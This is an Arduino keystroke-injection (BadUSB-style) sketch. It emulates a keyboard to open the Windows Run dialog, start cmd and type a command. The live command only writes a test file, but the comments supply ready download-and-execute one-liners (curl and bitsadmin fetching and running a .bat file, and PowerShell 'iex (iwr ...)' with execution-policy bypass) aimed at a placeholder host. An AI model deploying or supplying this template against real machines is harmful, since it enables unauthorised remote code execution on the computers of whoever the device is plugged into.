#include <Keyboard.h>

void setup() {
    // Start keyboard emulation
    Keyboard.begin();

    // Give Windows time to recognize the device
    delay(5000);

    // Open Run dialog (Win + R)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();

    delay(1000);

    // Open cmd
    Keyboard.print("cmd");
    Keyboard.write(KEY_RETURN);

    delay(1000);

    // One-liner command here
    // For bat files use:
    // cmd /c "curl -o %temp%\x.bat http://example.com/x.bat & %temp%\x.bat"
    // cmd /c "bitsadmin /transfer job /download /priority high https://example.com/file.bat %userprofile%\x.bat && %userprofile%\x.bat"
    // For powershell (compatible with older versions):
    // powershell -exec bypass -c "iex (iwr http://example.com/script.ps1)"
    Keyboard.print("echo Arduino test > %USERPROFILE%\\Downloads\\arduino_test.txt && exit");
    Keyboard.write(KEY_RETURN);

    // Stop keyboard emulation
    Keyboard.end();
}

void loop() {
    // Nothing here
}
